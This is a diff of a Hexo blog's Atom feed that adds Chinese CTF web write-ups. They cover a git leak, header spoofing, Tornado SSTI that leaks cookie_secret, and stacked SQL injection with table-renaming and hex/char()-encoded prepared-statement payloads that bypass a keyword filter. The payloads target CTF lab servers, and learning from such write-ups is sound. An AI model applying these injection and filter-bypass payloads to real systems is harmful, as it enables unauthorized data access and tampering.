@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://lingxin16.github.io/"/>
-  <updated>2020-01-31T17:25:34.509Z</updated>
+  <updated>2020-01-31T17:33:42.710Z</updated>
   <id>http://lingxin16.github.io/</id>
   
   <author>
@@ -17,25 +17,78 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>[护网杯 2018]easy_tornado</title>
-    <link href="http://lingxin16.github.io/2020/01/29/[%E6%8A%A4%E7%BD%91%E6%9D%AF%202018]easy_tornado/"/>
-    <id>http://lingxin16.github.io/2020/01/29/[%E6%8A%A4%E7%BD%91%E6%9D%AF%202018]easy_tornado/</id>
-    <published>2020-01-29T08:01:10.000Z</published>
-    <updated>2020-01-31T17:25:34.509Z</updated>
+    <title>Hgame-Week1-web</title>
+    <link href="http://lingxin16.github.io/2020/02/01/[Hgame]Week1-web/"/>
+    <id>http://lingxin16.github.io/2020/02/01/[Hgame]Week1-web/</id>
+    <published>2020-01-31T16:35:15.000Z</published>
+    <updated>2020-01-31T17:33:42.710Z</updated>
     
-    <content type="html"><![CDATA[<p>首先看题![QQ截图20200129160301](/[护网杯 2018]easy_tornado/QQ截图20200129160301.png)</p><a id="more"></a><p>里边的内容分别是</p><p>![QQ截图20200129160448](/[护网杯 2018]easy_tornado/QQ截图20200129160448.png)![QQ截图20200129160441](/[护网杯 2018]easy_tornado/QQ截图20200129160441.png)![QQ截图20200129160434](/[护网杯 2018]easy_tornado/QQ截图20200129160434.png)</p><p>我们可以直接得出flag所在的文件夹是/fllllllllllllag</p><p>分析这三个的url</p><blockquote><p><a href="http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=3af0858a46186b7d343f7dd9419e1525" target="_blank" rel="noopener">http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=3af0858a46186b7d343f7dd9419e1525</a></p></blockquote><blockquote><p><a href="http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/welcome.txt&amp;filehash=f9793be52dec6c36581bb8429f8c1039" target="_blank" rel="noopener">http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/welcome.txt&amp;filehash=f9793be52dec6c36581bb8429f8c1039</a></p></blockquote><blockquote><p><a href="http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/hints.txt&amp;filehash=e9155f0f3d25f1ad639771ca93cb5e5d" target="_blank" rel="noopener">http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/hints.txt&amp;filehash=e9155f0f3d25f1ad639771ca93cb5e5d</a></p></blockquote><p>我们可以得出这样的结论，flag所在文件的url应该是<a href="http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=" target="_blank" rel="noopener">http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=</a><strong><strong><strong>**</strong></strong></strong></p><p>至于这个<strong><strong><strong>**</strong></strong></strong>应该就是md5(cookie_secret+md5(filename))</p><p>filename我们已经知道是fllllllllllllag，那么我们接下来只需要找到cookie_secret</p><p>利用burp抓包我们并没有找到cookie，只能上百度了……（那咋办嘛）</p><p>通过百度得知在error页面存在SSTI模板注入（又是一个看不懂的东西……）</p><p>![憨憨落泪](/[护网杯 2018]easy_tornado/憨憨落泪.jpg)</p><p>附上关于SSTI模板注入的博客：<a href="https://blog.csdn.net/zz_Caleb/article/details/96480967" target="_blank" rel="noopener">SSTI完全学习</a></p><p>注入方式大概就是error?msg=0</p><p>……？？？？？？至于注入啥玩意儿，大佬说的是用handler.settings对象(这又是啥玩意儿，咱也不知道，咱也不敢问)</p><p>那么传递error?msg=</p><blockquote><p><a href="http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/error?msg=" target="_blank" rel="noopener">http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/error?msg=</a></p></blockquote><p>得到这个回显![QQ截图20200129162705](/[护网杯 2018]easy_tornado/QQ截图20200129162705.png)</p><p>‘cookie_secret’: ‘66015e24-a274-4abf-bd65-6776ae208dc4’}</p><p>接下来构造</p><blockquote><p><a href="http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=ee31ce84bedac7c8242d99b3047d4ad1" target="_blank" rel="noopener">http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=ee31ce84bedac7c8242d99b3047d4ad1</a></p></blockquote><p>访问得到![QQ截图20200129163253](/[护网杯 2018]easy_tornado/QQ截图20200129163253.png)</p><p>我太难了….![1](/[护网杯 2018]easy_tornado/1.jpg)</p>]]></content>
+    <content type="html"><![CDATA[<h2 id="web1-Cosmos-的博客"><a href="#web1-Cosmos-的博客" class="headerlink" title="web1-Cosmos 的博客"></a>web1-Cosmos 的博客</h2><p>打开网站<img src="/2020/02/01/[Hgame]Week1-web/QQ%E6%88%AA%E5%9B%BE20200201004038.png" alt="QQ截图20200201004038"></p><a id="more"></a><p>发现提及到博客、github、版本管理工具，可以联想到git泄露（hexo博客能是白搭建的吗！！！）</p><p>构造url(/.git/config)</p><blockquote><p><a href="http://cosmos.hgame.n3ko.co/.git/config" target="_blank" rel="noopener">http://cosmos.hgame.n3ko.co/.git/config</a></p></blockquote><p><img src="/2020/02/01/[Hgame]Week1-web/%5BHgame%5DWeek1-web%5CQQ%E6%88%AA%E5%9B%BE20200201004006.png" alt="QQ截图20200201004006"></p><p>发现目标仓库</p><blockquote><p><a href="https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc" target="_blank" rel="noopener">https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc</a></p></blockquote><p><img src="/2020/02/01/[Hgame]Week1-web/QQ%E6%88%AA%E5%9B%BE20200201004657.png" alt="QQ截图20200201004657"></p><p>根据提示解码</p><h2 id="web2-接头霸王"><a href="#web2-接头霸王" class="headerlink" title="web2-接头霸王"></a>web2-接头霸王</h2><p><img src="/2020/02/01/[Hgame]Week1-web/QQ%E6%88%AA%E5%9B%BE20200201004847.png" alt="QQ截图20200201004847">根据提示利用burpsuit修改HTTP请求头 如图</p><p><img src="/2020/02/01/[Hgame]Week1-web/QQ%E6%88%AA%E5%9B%BE20200201005415.png" alt="QQ截图20200201005415"></p><p>得到flag<img src="/2020/02/01/[Hgame]Week1-web/QQ%E6%88%AA%E5%9B%BE20200201005327.png" alt="QQ截图20200201005327"></p><h2 id="web3-Code-World"><a href="#web3-Code-World" class="headerlink" title="web3-Code World"></a>web3-Code World</h2><p>打开之后发现报错403 Forbidden</p><p><img src="/2020/02/01/[Hgame]Week1-web/QQ%E6%88%AA%E5%9B%BE20200201005544.png" alt="QQ截图20200201005544"></p><p>查看源代码发现<img src="/2020/02/01/[Hgame]Week1-web/QQ%E6%88%AA%E5%9B%BE20200201005552.png" alt="QQ截图20200201005552"></p><p>很显然是被人刻意改动了，然后跳转到了/new.php</p><p>我们用burpsuit抓包发现其实报错是405 Not Allowed<img src="/2020/02/01/[Hgame]Week1-web/QQ%E6%88%AA%E5%9B%BE20200201005935.png" alt="QQ截图20200201005935"></p><p>百度一下405 Not Allowed这个报错</p><p><img src="/2020/02/01/[Hgame]Week1-web/QQ%E6%88%AA%E5%9B%BE20200201010056.png" alt="QQ截图20200201010056"></p><p>就是两种请求方式之间出错  然后我们修改请求方式即可正常打开<img src="/2020/02/01/[Hgame]Week1-web/QQ%E6%88%AA%E5%9B%BE20200201010301.png" alt="QQ截图20200201010301"></p><p>根据提示利用url传参?a=4+6</p><p>这里+需要url编码%2b    即?a=4%2b6</p><p>然后利用POST请求得到flag</p><p><img src="/2020/02/01/[Hgame]Week1-web/QQ%E6%88%AA%E5%9B%BE20200201010542.png" alt="QQ截图20200201010542"></p><h2 id="web4-🐔尼泰玫"><a href="#web4-🐔尼泰玫" class="headerlink" title="web4-🐔尼泰玫"></a>web4-🐔尼泰玫</h2><p>打开是个小游戏  cxk打篮球(手动滑稽)</p><p><img src="/2020/02/01/[Hgame]Week1-web/QQ%E6%88%AA%E5%9B%BE20200201010909.png" alt="QQ截图20200201010909"></p><p>提示我们需要30000分才能拿到flag</p><p><img src="/2020/02/01/[Hgame]Week1-web/QQ%E6%88%AA%E5%9B%BE20200201011655.png" alt="QQ截图20200201011655"></p><p>然后我们在网络状态中发现了submit这个文件</p><p>查看之后发现是把分数数据发送给后台然后判断，我们直接抓包编辑重发</p><p>得到flag<img src="/2020/02/01/[Hgame]Week1-web/QQ%E6%88%AA%E5%9B%BE20200201011949.png" alt="QQ截图20200201011949"></p>]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;首先看题![QQ截图20200129160301](/[护网杯 2018]easy_tornado/QQ截图20200129160301.png)&lt;/p&gt;
+      &lt;h2 id=&quot;web1-Cosmos-的博客&quot;&gt;&lt;a href=&quot;#web1-Cosmos-的博客&quot; class=&quot;headerlink&quot; title=&quot;web1-Cosmos 的博客&quot;&gt;&lt;/a&gt;web1-Cosmos 的博客&lt;/h2&gt;&lt;p&gt;打开网站&lt;img src=&quot;/2020/02/01/[Hgame]Week1-web/QQ%E6%88%AA%E5%9B%BE20200201004038.png&quot; alt=&quot;QQ截图20200201004038&quot;&gt;&lt;/p&gt;
     
     </summary>
     
     
     
-      <category term="模板注入" scheme="http://lingxin16.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
+      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
+    
+      <category term="git泄露" scheme="http://lingxin16.github.io/tags/git%E6%B3%84%E9%9C%B2/"/>
+    
+      <category term="burpsuit" scheme="http://lingxin16.github.io/tags/burpsuit/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>护网杯2018-easy_tornado</title>
+    <link href="http://lingxin16.github.io/2020/01/29/[%E6%8A%A4%E7%BD%91%E6%9D%AF2018]easy_tornado/"/>
+    <id>http://lingxin16.github.io/2020/01/29/[%E6%8A%A4%E7%BD%91%E6%9D%AF2018]easy_tornado/</id>
+    <published>2020-01-29T08:01:10.000Z</published>
+    <updated>2020-01-31T17:33:21.568Z</updated>
+    
+    <content type="html"><![CDATA[<p>首先看题<img src="/2020/01/29/[%E6%8A%A4%E7%BD%91%E6%9D%AF2018]easy_tornado/QQ%E6%88%AA%E5%9B%BE20200129160301.png" alt="QQ截图20200129160301"></p><a id="more"></a><p>里边的内容分别是</p><p>![QQ截图20200129160448](/[护网杯 2018]easy_tornado/QQ截图20200129160448.png)<img src="/2020/01/29/[%E6%8A%A4%E7%BD%91%E6%9D%AF2018]easy_tornado/QQ%E6%88%AA%E5%9B%BE20200129160441.png" alt="QQ截图20200129160441">![QQ截图20200129160434](/[护网杯 2018]easy_tornado/QQ截图20200129160434.png)</p><p>我们可以直接得出flag所在的文件夹是/fllllllllllllag</p><p>分析这三个的url</p><blockquote><p><a href="http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=3af0858a46186b7d343f7dd9419e1525" target="_blank" rel="noopener">http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=3af0858a46186b7d343f7dd9419e1525</a></p></blockquote><blockquote><p><a href="http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/welcome.txt&amp;filehash=f9793be52dec6c36581bb8429f8c1039" target="_blank" rel="noopener">http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/welcome.txt&amp;filehash=f9793be52dec6c36581bb8429f8c1039</a></p></blockquote><blockquote><p><a href="http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/hints.txt&amp;filehash=e9155f0f3d25f1ad639771ca93cb5e5d" target="_blank" rel="noopener">http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/hints.txt&amp;filehash=e9155f0f3d25f1ad639771ca93cb5e5d</a></p></blockquote><p>我们可以得出这样的结论，flag所在文件的url应该是<a href="http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=" target="_blank" rel="noopener">http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=</a><strong><strong><strong>**</strong></strong></strong></p><p>至于这个<strong><strong><strong>**</strong></strong></strong>应该就是md5(cookie_secret+md5(filename))</p><p>filename我们已经知道是fllllllllllllag，那么我们接下来只需要找到cookie_secret</p><p>利用burp抓包我们并没有找到cookie，只能上百度了……（那咋办嘛）</p><p>通过百度得知在error页面存在SSTI模板注入（又是一个看不懂的东西……）</p><p><img src="/2020/01/29/[%E6%8A%A4%E7%BD%91%E6%9D%AF2018]easy_tornado/%E6%86%A8%E6%86%A8%E8%90%BD%E6%B3%AA.jpg" alt="憨憨落泪"></p><p>附上关于SSTI模板注入的博客：<a href="https://blog.csdn.net/zz_Caleb/article/details/96480967" target="_blank" rel="noopener">SSTI完全学习</a></p><p>注入方式大概就是error?msg=0</p><p>……？？？？？？至于注入啥玩意儿，大佬说的是用handler.settings对象(这又是啥玩意儿，咱也不知道，咱也不敢问)</p><p>那么传递error?msg=</p><blockquote><p><a href="http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/error?msg=" target="_blank" rel="noopener">http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/error?msg=</a></p></blockquote><p>得到这个回显<img src="/2020/01/29/[%E6%8A%A4%E7%BD%91%E6%9D%AF2018]easy_tornado/QQ%E6%88%AA%E5%9B%BE20200129162705.png" alt="QQ截图20200129162705"></p><p>‘cookie_secret’: ‘66015e24-a274-4abf-bd65-6776ae208dc4’}</p><p>接下来构造</p><blockquote><p><a href="http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=ee31ce84bedac7c8242d99b3047d4ad1" target="_blank" rel="noopener">http://de0ee060-7c62-4c47-9155-96c35ec001fe.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=ee31ce84bedac7c8242d99b3047d4ad1</a></p></blockquote><p>访问得到<img src="/2020/01/29/[%E6%8A%A4%E7%BD%91%E6%9D%AF2018]easy_tornado/QQ%E6%88%AA%E5%9B%BE20200129163253.png" alt="QQ截图20200129163253"></p><p>我太难了….<img src="/2020/01/29/[%E6%8A%A4%E7%BD%91%E6%9D%AF2018]easy_tornado/1.jpg" alt="1"></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;首先看题&lt;img src=&quot;/2020/01/29/[%E6%8A%A4%E7%BD%91%E6%9D%AF2018]easy_tornado/QQ%E6%88%AA%E5%9B%BE20200129160301.png&quot; alt=&quot;QQ截图20200129160301&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
     
       <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
+    
+      <category term="模板注入" scheme="http://lingxin16.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>强网杯-随便注</title>
+    <link href="http://lingxin16.github.io/2020/01/12/[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
+    <id>http://lingxin16.github.io/2020/01/12/[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8/</id>
+    <published>2020-01-12T07:06:22.000Z</published>
+    <updated>2020-01-31T17:33:04.205Z</updated>
+    
+    <content type="html"><![CDATA[<p>通过简单的注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">1&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">1&#39;#</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">1&#39;;order by 1;#</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,2#</span></pre></td></tr></table></figure><p>得出有过滤规则</p><a id="more"></a><p><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p><p>一些select update delect语句都被过滤了</p><p>那么我们就用堆叠注入（不要问为什么，我百度来的）</p><p>首先介绍一下堆叠注入，简单来说就说将多条语句并列执行（语句1;语句2）同时执行语句1,2</p><p><code>1‘;show databases;#</code>   查数据库</p><p><img src="/2020/01/12/[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8/%E6%9F%A5%E5%BA%93.png" alt="查库"></p><p><code>1‘;show tables;#</code>   查表 发现有两个表</p><p><img src="/2020/01/12/[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8/%E6%9F%A5%E8%A1%A8.png" alt="查表"></p><p><code>1&#39;;show columns from 1919810931114514;#</code>   </p><p><code>1&#39;;show columns from words;#</code>   </p><p>分别查第一张表和第二张表</p><p>这里的1919810931114514要用反引号`括起 （数字串为表名的表操作时要加反引号）</p><p><img src="/2020/01/12/[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8/words%E8%A1%A8.png" alt="words表"></p><p>在第一张表中发现了flag字段 但是只有words表有回显，然后看了一下大佬的绕过规则</p><p>这里通过修改表名<img src="/2020/01/12/[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8%5C%E4%BF%AE%E6%94%B9%E8%A1%A8%E5%90%8D.png" alt="修改表名"></p><p><code>1&#39;;rename tables &#39;words&#39; to &#39;words1&#39;;rename tables &#39;1919810931114514&#39; to &#39;words&#39;; alter table &#39;words&#39; change &#39;flag&#39; &#39;id&#39; varchar(100);#</code></p><p>然后用1’ or 1=1#得到flag</p><p><img src="/2020/01/12/[%E5%BC%BA%E7%BD%91%E6%9D%AF]%E9%9A%8F%E4%BE%BF%E6%B3%A8/flag.png" alt="flag"></p><p>这里还有大佬的另外几种绕过方式（通过mysql预处理）</p><p>语句1：</p><p><code>1&#39;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</code></p><p>是将select * from ’1919810931114514‘转化为16进制</p><p>语句2；</p><p><code>1&#39;;SET @sql=concat(char(115,101,108,101,99,116),&quot; * from 1919810931114514&quot;);PREPARE sqla from @sql;EXECUTE sqla;#</code></p><p>(char(115,101,108,101,99,116)是把s e l e c t的ascii码转换为字符连接起来，再把后面的拼接起来就成了select * from ‘1919810931114514’)</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;通过简单的注入&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&amp;#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&amp;#39;#&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&amp;#39;;order by 1;#&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&amp;#39; union select 1,2#&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;得出有过滤规则&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="sql注入" scheme="http://lingxin16.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="buuctf" scheme="http://lingxin16.github.io/tags/buuctf/"/>
+    
+      <category term="堆叠注入" scheme="http://lingxin16.github.io/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
@@ -44,18 +97,14 @@
     <link href="http://lingxin16.github.io/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/"/>
     <id>http://lingxin16.github.io/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/</id>
     <published>2020-01-02T10:03:53.000Z</published>
-    <updated>2020-01-02T10:14:57.052Z</updated>
+    <updated>2020-01-31T17:27:51.474Z</updated>
     
-    <content type="html"><![CDATA[<p>先用<code>hexo new page ceshi</code>建立一个ceshi的单页</p><p>通过在文件头中加入<code>layout:false</code>跳过主题渲染</p><p><img src="/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/QQ%E6%88%AA%E5%9B%BE20200102180630.png" alt="QQ截图20200102180630"></p><p>然后将html代码插入到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;</span></pre></td></tr></table></figure><p>和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#123;% endraw %&#125;</span></pre></td></tr></table></figure><p>中，就可以了。</p><p><img src="/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/%E6%86%A8%E6%86%A8%E8%84%B8%E7%BA%A2.jpg" alt="憨憨脸红"></p>]]></content>
+    <content type="html"><![CDATA[<p>先用<code>hexo new page ceshi</code>建立一个ceshi的单页</p><p>通过在文件头中加入<code>layout:false</code>跳过主题渲染</p><a id="more"></a><p><img src="/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/QQ%E6%88%AA%E5%9B%BE20200102180630.png" alt="QQ截图20200102180630"></p><p>然后将html代码插入到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;</span></pre></td></tr></table></figure><p>和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#123;% endraw %&#125;</span></pre></td></tr></table></figure><p>中，就可以了。</p><p><img src="/2020/01/02/%E5%88%9B%E5%BB%BA%E5%8D%95%E9%A1%B5/%E6%86%A8%E6%86%A8%E8%84%B8%E7%BA%A2.jpg" alt="憨憨脸红"></p>]]></content>
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;先用&lt;code&gt;hexo new page ceshi&lt;/code&gt;建立一个ceshi的单页&lt;/p&gt;
+      &lt;p&gt;先用&lt;code&gt;hexo new page ceshi&lt;/code&gt;建立一个ceshi的单页&lt;/p&gt;
 &lt;p&gt;通过在文件头中加入&lt;code&gt;layout:false&lt;/code&gt;跳过主题渲染&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/2020/01/02/%E5%88%9B%E5%
-      
     
     </summary>
     
